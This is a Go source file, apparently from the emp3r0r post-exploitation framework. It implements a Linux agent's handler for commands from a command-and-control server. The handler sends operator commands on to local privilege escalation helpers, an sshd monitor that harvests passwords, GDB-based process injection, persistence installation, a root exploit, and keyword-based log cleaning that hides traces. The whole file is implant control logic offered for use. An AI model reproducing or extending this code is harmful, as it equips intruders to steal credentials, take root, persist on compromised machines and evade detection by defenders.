//go:build linux
// +build linux

package agent

import (
	"fmt"
	"log"
	"os"
	"strconv"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func platformC2CommandsHandler(cmdSlice []string) (out string) {
	var err error

	switch cmdSlice[0] {

	case emp3r0r_data.C2CmdLPE:
		// LPE helper
		// !lpe script_name
		if len(cmdSlice) < 2 {
			out = fmt.Sprintf("Error: args error: %s", cmdSlice)
			log.Printf(out)
			return
		}

		helper := cmdSlice[1]
		out = runLPEHelper(helper)
		return

	case emp3r0r_data.C2CmdSSHHarvester:
		passfile := fmt.Sprintf("%s/%s.txt",
			RuntimeConfig.AgentRoot, util.RandStr(10))
		out = fmt.Sprintf("Look for passwords in %s", passfile)
		go sshd_monitor(passfile)
		return

		// GDB inject
		// !inject method pid
	case emp3r0r_data.C2CmdInject:
		if len(cmdSlice) != 3 {
			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
			return
		}
		out = fmt.Sprintf("%s: success", cmdSlice[1])
		pid, err := strconv.ParseInt(cmdSlice[2], 10, 32)
		if err != nil {
			log.Print("Invalid pid")
		}
		err = InjectorHandler(int(pid), cmdSlice[1])
		if err != nil {
			out = "Error: " + err.Error()
		}
		return

		// persistence
		// !persistence method
	case emp3r0r_data.C2CmdPersistence:
		if len(cmdSlice) != 2 {
			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
			return
		}
		out = "Success"
		if cmdSlice[1] == "all" {
			err = PersistAllInOne()
			if err != nil {
				log.Print(err)
				out = fmt.Sprintf("Some has failed: %v", err)
			}
		} else {
			out = "Error: No such method available"
			if method, exists := PersistMethods[cmdSlice[1]]; exists {
				out = "Success"
				err = method()
				if err != nil {
					log.Println(err)
					out = fmt.Sprintf("Error: %v", err)
				}
			}
		}
		return

		// get_root
		// !get_root
	case emp3r0r_data.C2CmdGetRoot:
		if os.Geteuid() == 0 {
			out = "Warning: You already have root!"
		} else {
			err = GetRoot()
			out = fmt.Sprintf("Error: LPE exploit failed:\n%v", err)
			if err == nil {
				out = "If you see agent goes online again, you got root!"
			}
		}
		return

		// log cleaner
		// !clean_log keyword
	case emp3r0r_data.C2CmdCleanLog:
		if len(cmdSlice) != 2 {
			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
			return
		}
		keyword := cmdSlice[1]
		out = "Done"
		err = CleanAllByKeyword(keyword)
		if err != nil {
			out = err.Error()
		}
		return
	}

	return fmt.Sprintf("Error: Unknown command %v", cmdSlice)
}
